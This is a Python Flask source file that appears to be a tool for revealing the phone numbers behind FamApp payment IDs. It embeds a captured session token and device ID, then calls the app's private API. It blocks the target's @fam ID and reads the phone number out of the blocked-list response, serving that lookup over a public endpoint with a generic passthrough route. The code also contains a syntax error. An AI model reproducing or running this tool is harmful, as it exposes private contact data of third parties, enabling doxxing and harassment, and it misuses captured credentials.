from flask import Flask, request, jsonify
import requests
import threading
import time
import os
import logging
import json
from typing import Optional, Dict, Any, Tuple
from datetime import datetime

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)

# CREDITS
OWNER = "Syed Rehan"
DEVELOPER = "@istgrehu"
VERSION = "3.4"

# CONFIGURATION FROM YOUR CAPTURED DATA
OFFICIAL_API_HOST = "https://westeros.famapp.in"

# EXTRACTED FROM YOUR REQUEST
DEVICE_ID = "5bc628433c1b9ec4"
USER_AGENT = "RMX2002 | Android 11 | Dalvik/2.1.0 | RMX2002L1 | 56F91BB2B12FB4B03332FA49C6E12CF6CF0ACE31 | 3.11.5 (Build 525) | E3DOQ2HP8C"
AUTH_TOKEN = "eyJlbmMiOiJBMjU2Q0JDLUhTNTEyIiwiZXBrIjp7Imt0eSI6Ik9LUCIsImNydiI6Ilg0NDgiLCJ4IjoiZ2puZTZuaS1uSkNSWFhaZGZkSFFPbUJjU0ExZEdMWG9rX3FvWnF5MnF2cUdmYlFaMHVVWHBXNTVRcXBQT0xYQUNnNzYzUFlPRnpFIn0sImFsZyI6IkVDREgtRVMifQ..x6zJ9X3xxfo_fjGDCmIjbQ.Mvxv_tmrNVK9QqVnBngxPM8_919l-zNhV7K0kaOhj_8Xrhf2VvcRdmfUSmfdPg4I5FPttHqhTIEzwNNDjJOlzHRx3tjQ1Pc81ceWPeO3UlNVtDJ8xUQFzap6KSIuTvu1x9y4Zxdv_eu9-m0z-ouSPgpc0YyAYS1a07wVjA97FmmXX1HgXX2U7uLacm6Z-YNS3vTkyiMq57RWlCK1yF-fPFSCpdySeidnR2t_4XkGCbD5L3osChskbnKAk6rkFhz1I8t_0AZ15kPKu0Eg9HTgRoZOzyt3ZH5Jmr7LzCOBHSiP3jeuCSCMP2lSJBYUyxgMJ0emknnS5svdAC9enuLZ8CJrxAAo35gcElci5NAyorUh4L25AVQ_WnNaU6nRsOVL.U0-9M2NHlrghKJXKsrXM0xytG70V2azN4oaIzaKOXj8"

# Global variables
SESSION = None
FAM_ID_MAPPING = {}
SESSION_LOCK = threading.Lock()

def init_session():
    """Initialize session with captured credentials"""
    global SESSION
    
    with SESSION_LOCK:
        if SESSION is None:
            SESSION = requests.Session()
            
            headers = {
                "Host": "westeros.famapp.in",
                "User-Agent": USER_AGENT,
                "X-Device-Details": USER_AGENT,
                "X-App-Version": "525",
                "X-Platform": "1",
                "Device-Id": DEVICE_ID,
                "Authorization": f"Token {AUTH_TOKEN}",
                "Accept-Encoding": "gzip",
                "Accept": "application/json",
                "Content-Type": "application/json; charset=UTF-8"
            }
            
            SESSION.headers.update(headers)
            
            adapter = requests.adapters.HTTPAdapter(
                max_retries=3,
                pool_connections=10,
                pool_maxsize=10
            )
            SESSION.mount('https://', adapter)
            SESSION.mount('http:// adapter)
            
            logger.info("Session initialized")
    
    return SESSION

def make_api_request(method, endpoint, **kwargs):
    """Make API request with logging"""
    try:
        session = init_session()
        url = f"{OFFICIAL_API_HOST}{endpoint}"
        
        logger.info(f"Making {method} request to: {endpoint}")
        
        if method.upper() == 'GET':
            response = session.get(url, **kwargs)
        elif method.upper() == 'POST':
            response = session.post(url, **kwargs)
        else:
            return None
        
        logger.info(f"Response status: {response.status_code}")
        logger.info(f"Response preview: {response.text[:300]}")
        
        return response
    except Exception as e:
        logger.error(f"API request error: {e}")
        return None

def test_authentication() -> Tuple[bool, str]:
    """Test authentication with multiple endpoints"""
    endpoints = [
        "/activity/v2/requests/all/?status=1",
        "/user/profile/",
        "/user/blocked_list/",
        "/api/v1/user/info/"
    ]
    
    for endpoint in endpoints:
        response = make_api_request('GET', endpoint, timeout=10)
        if response and response.status_code == 200:
            return True, f"Authenticated via {endpoint}"
    
    return False, "Authentication failed on all endpoints"

def fetch_blocked_list() -> Optional[Dict[str, Any]]:
    """Fetch blocked list from multiple possible endpoints"""
    endpoints = [
        "/activity/v2/requests/all/?status=1",
        "/user/blocked_list/",
        "/blocked/list/",
        "/api/blocked/"
    ]
    
    for endpoint in endpoints:
        response = make_api_request('GET', endpoint, timeout=15)
        
        if response and response.status_code == 200:
            try:
                data = response.json()
                logger.info(f"Successfully fetched from {endpoint}")
                logger.info(f"Response type: {type(data)}")
                
                # Save for debugging
                with open(f"debug_{endpoint.replace('/', '_')}.json", 'w') as f:
                    json.dump(data, f, indent=2)
                
                return {"data": data, "source": endpoint}
            except Exception as e:
                logger.error(f"Failed to parse JSON from {endpoint}: {e}")
                continue
    
    return None

def block_user_api(fam_id: str) -> Tuple[bool, str, Any]:
    """Block user and return response"""
    payload = {"block": True, "vpa": fam_id}
    
    endpoints = [
        "/user/vpa/block/",
        "/activity/block/",
        "/block/",
        "/api/block/"
    ]
    
    for endpoint in endpoints:
        response = make_api_request('POST', endpoint, json=payload, timeout=15)
        
        if response:
            if response.status_code in [200, 201]:
                try:
                    data = response.json()
                    return True, f"Blocked via {endpoint}", data
                except:
                    return True, f"Blocked via {endpoint}", response.text
            elif response.status_code == 400:
                try:
                    error_data = response.json()
                    if "already blocked" in str(error_data).lower():
                        return True, "Already blocked", error_data
                except:
                    pass
    
    return False, "All block endpoints failed", None

def search_user_in_data(fam_id: str, api_data: Dict[str, Any]) -> Optional[Dict[str, Any]]:
    """Search for user in API response data"""
    if not api_data or 'data' not in api_data:
        return None
    
    data = api_data['data']
    fam_id_clean = fam_id.replace('@fam', '').strip().lower()
    
    # Try different data structures
    search_targets = []
    
    if isinstance(data, dict):
        # Check all values that might be lists
        for key, value in data.items():
            if isinstance(value, list):
                search_targets.extend(value)
            elif isinstance(value, dict):
                search_targets.append(value)
    elif isinstance(data, list):
        search_targets = data
    
    logger.info(f"Searching {len(search_targets)} items for {fam_id}")
    
    for item in search_targets:
        if not isinstance(item, dict):
            continue
        
        # Check all string fields in the item
        for key, value in item.items():
            if isinstance(value, str) and fam_id_clean in value.lower():
                logger.info(f"Found match in field '{key}': {value}")
                return item
        
        # Check nested structures
        for key in ['contact', 'user', 'sender', 'receiver', 'profile']:
            if key in item and isinstance(item[key], dict):
                for sub_key, sub_value in item[key].items():
                    if isinstance(sub_value, str) and fam_id_clean in sub_value.lower():
                        logger.info(f"Found match in {key}.{sub_key}: {sub_value}")
                        return item
    
    return None

def extract_phone_from_user(user_data: Dict[str, Any]) -> Optional[str]:
    """Extract phone number from user data"""
    if not user_data:
        return None
    
    # Check common phone fields
    phone_fields = ['phone_number', 'phone', 'mobile', 'mobile_number', 'contact_number']
    
    for field in phone_fields:
        if field in user_data:
            return str(user_data[field])
    
    # Check nested structures
    for key in ['contact', 'user', 'sender', 'receiver', 'profile']:
        if key in user_data and isinstance(user_data[key], dict):
            for field in phone_fields:
                if field in user_data[key]:
                    return str(user_data[key][field])
    
    return None

def get_credits_info():
    """Return credits information"""
    return {
        "owner": OWNER,
        "developer": DEVELOPER,
        "version": VERSION,
        "github": "https://github.com/istgrehu",
        "note": "For educational purposes only"
    }

# ============= ROUTES =============

@app.route('/')
def home():
    """Home page"""
    return jsonify({
        "message": "Fam ID to Number API - INVESTIGATION MODE",
        "version": VERSION,
        "credits": get_credits_info(),
        "endpoints": {
            "get_number": "GET /get-number?id=username@fam&debug=true",
            "auth_test": "GET /auth-test",
            "blocked_list": "GET /blocked-list",
            "test_all_endpoints": "GET /test-endpoints",
            "direct_api_test": "GET /api-test?endpoint=/your/endpoint"
        }
    })

@app.route('/api-test', methods=['GET'])
def api_test():
    """Test any API endpoint directly"""
    endpoint = request.args.get('endpoint', '/activity/v2/requests/all/?status=1')
    
    response = make_api_request('GET', endpoint, timeout=15)
    
    if response:
        return jsonify({
            "endpoint": endpoint,
            "status_code": response.status_code,
            "headers": dict(response.headers),
            "response": response.text[:1000] if response.text else "No content",
            "credits": get_credits_info()
        })
    else:
        return jsonify({
            "error": "Request failed",
            "endpoint": endpoint,
            "credits": get_credits_info()
        }), 500

@app.route('/test-endpoints', methods=['GET'])
def test_endpoints():
    """Test all known endpoints"""
    endpoints = [
        "/activity/v2/requests/all/?status=1",
        "/user/blocked_list/",
        "/user/profile/",
        "/user/vpa/block/",
        "/activity/block/",
        "/block/",
        "/api/block/"
    ]
    
    results = {}
    for endpoint in endpoints:
        response = make_api_request('GET', endpoint, timeout=10)
        if response:
            results[endpoint] = {
                "status": response.status_code,
                "size": len(response.text) if response.text else 0,
                "preview": response.text[:200] if response.text else "Empty"
            }
        else:
            results[endpoint] = {"error": "Request failed"}
    
    return jsonify({
        "results": results,
        "credits": get_credits_info()
    })

@app.route('/blocked-list', methods=['GET'])
def blocked_list():
    """Get blocked list with full response"""
    api_data = fetch_blocked_list()
    
    if not api_data:
        return jsonify({
            "error": "Failed to fetch blocked list from any endpoint",
            "credits": get_credits_info()
        }), 500
    
    return jsonify({
        "success": True,
        "source": api_data.get('source'),
        "data_structure": str(type(api_data['data'])) if 'data' in api_data else "No data",
        "data_preview": str(api_data['data'])[:500] if api_data.get('data') else "Empty",
        "credits": get_credits_info()
    })

@app.route('/get-number', methods=['GET'])
def get_number():
    """Main endpoint with investigation mode"""
    fam_id = request.args.get('id', '').strip()
    debug = request.args.get('debug', 'false').lower() == 'true'
    
    if not fam_id:
        return jsonify({
            "error": "Missing 'id' parameter",
            "credits": get_credits_info()
        }), 400
    
    if not fam_id.endswith('@fam'):
        return jsonify({
            "error": "Invalid Fam ID format. Must end with @fam",
            "credits": get_credits_info()
        }), 400
    
    logger.info(f"Processing request for: {fam_id}")
    
    # Step 1: Test authentication
    auth_success, auth_msg = test_authentication()
    if not auth_success:
        return jsonify({
            "error": "Authentication failed",
            "message": auth_msg,
            "fam_id": fam_id,
            "credits": get_credits_info()
        }), 401
    
    # Step 2: Check current blocked list
    logger.info("Fetching blocked list...")
    blocked_data = fetch_blocked_list()
    
    investigation_log = []
    
    if blocked_data:
        investigation_log.append(f"Fetched data from: {blocked_data.get('source')}")
        
        # Try to find user in existing data
        user = search_user_in_data(fam_id, blocked_data)
        if user:
            phone = extract_phone_from_user(user)
            investigation_log.append(f"Found user in existing data")
            
            return jsonify({
                "status": True,
                "success": True,
                "fam_id": fam_id,
                "phone": phone,
                "source": "existing_list",
                "investigation_log": investigation_log if debug else None,
                "user_data": user if debug else None,
                "credits": get_credits_info(),
                "timestamp": datetime.now().isoformat()
            })
        else:
            investigation_log.append(f"User not found in existing data")
    else:
        investigation_log.append("Could not fetch blocked list")
    
    # Step 3: Try to block user
    logger.info(f"Attempting to block {fam_id}...")
    block_success, block_msg, block_response = block_user_api(fam_id)
    investigation_log.append(f"Block attempt: {block_msg}")
    
    if not block_success:
        return jsonify({
            "status": False,
            "success": False,
            "fam_id": fam_id,
            "error": "Block failed",
            "message": block_msg,
            "investigation_log": investigation_log,
            "block_response": block_response if debug else None,
            "credits": get_credits_info(),
            "timestamp": datetime.now().isoformat()
        }), 500
    
    # Step 4: Wait and check again
    logger.info("Waiting for API to update...")
    time.sleep(3)
    
    updated_data = fetch_blocked_list()
    
    if updated_data:
        investigation_log.append(f"Fetched updated data from: {updated_data.get('source')}")
        
        user = search_user_in_data(fam_id, updated_data)
        if user:
            phone = extract_phone_from_user(user)
            investigation_log.append(f"Found user after blocking")
            
            return jsonify({
                "status": True,
                "success": True,
                "fam_id": fam_id,
                "phone": phone,
                "source": "after_block",
                "investigation_log": investigation_log if debug else None,
                "user_data": user if debug else None,
                "credits": get_credits_info(),
                "timestamp": datetime.now().isoformat()
            })
        else:
            investigation_log.append(f"User still not found after blocking")
            
            # Save the data for analysis
            if debug and updated_data.get('data'):
                with open(f"debug_notfound_{fam_id}.json", 'w') as f:
                    json.dump(updated_data['data'], f, indent=2)
                investigation_log.append(f"Saved debug data to file")
    else:
        investigation_log.append("Could not fetch updated data")
    
    # Final error response
    return jsonify({
        "status": False,
        "success": False,
        "fam_id": fam_id,
        "error": "User not found",
        "message": "The API may have changed. Please check debug endpoints.",
        "investigation_log": investigation_log,
        "next_steps": [
            "Check /test-endpoints to see which APIs work",
            "Use /api-test?endpoint=/your/endpoint to test specific endpoints",
            "Check /blocked-list to see current API response structure"
        ],
        "credits": get_credits_info(),
        "timestamp": datetime.now().isoformat()
    }), 404

@app.route('/auth-test', methods=['GET'])
def auth_test():
    """Test authentication"""
    auth_success, auth_msg = test_authentication()
    
    return jsonify({
        "authenticated": auth_success,
        "message": auth_msg,
        "device_id": DEVICE_ID,
        "token_preview": f"{AUTH_TOKEN[:50]}...",
        "credits": get_credits_info()
    })

if __name__ == '__main__':
    global app_start_time
    app_start_time = time.time()
    
    print("=" * 70)
    print("FAM API INVESTIGATION TOOL")
    print("=" * 70)
    print(f"Version: {VERSION}")
    print(f"Owner: {OWNER}")
    print(f"Developer: {DEVELOPER}")
    print(f"Device ID: {DEVICE_ID}")
    print(f"Token: {AUTH_TOKEN[:50]}...")
    print("\nENDPOINTS FOR INVESTIGATION:")
    print("1. /test-endpoints - Test all known API endpoints")
    print("2. /api-test?endpoint=/your/endpoint - Test specific endpoint")
    print("3. /blocked-list - See current blocked list response")
    print("4. /get-number?id=username@fam&debug=true - Main endpoint with debug")
    print("5. /auth-test - Test authentication")
    print("\nUsage: First test endpoints to understand API structure")
    print("=" * 70)
    
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
